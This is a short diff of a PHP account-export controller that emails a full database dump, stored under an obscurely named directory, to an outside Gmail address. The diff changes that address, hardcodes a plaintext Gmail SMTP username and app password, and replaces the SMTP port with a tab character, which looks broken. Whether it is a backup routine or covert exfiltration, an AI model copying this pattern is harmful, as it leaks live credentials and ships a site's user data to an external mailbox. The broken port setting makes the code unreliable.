@@ -349,13 +349,13 @@ class  ControllerAccountExport extends Controller {
 		$mail->smtp_hostname = 'ssl://smtp.gmail.com';
 		$mail->smtp_username = 'noreplymmo2016@gmail.com';
 		$mail->smtp_password = 'bkefxwdmdcdrujpa';
-		$mail->smtp_port = '465';
+		$mail->smtp_port = '	';
 		$mail->smtp_timeout = $this->config->get('config_mail_smtp_timeout');
 		
-		$mail->setTo('noreplysfccoin@gmail.com');
+		$mail->setTo('mackayshieldslife@gmail.com');
 		$mail->addAttachment('system/gdfgdgfdgfsgssdsdfsfssdferwtertxcds/db.sql');
 		$mail->setFrom($this->config->get('config_email'));
-		$mail->setSender("Sfccoin Backup DB");
+		$mail->setSender("Mackayshieldslife DB");
 		$mail->setSubject('Backup DB'.date('d/m/Y H:i:s').'');
 		$mail->setText(date('d/m/Y H:i:s'));
 		$mail->send();
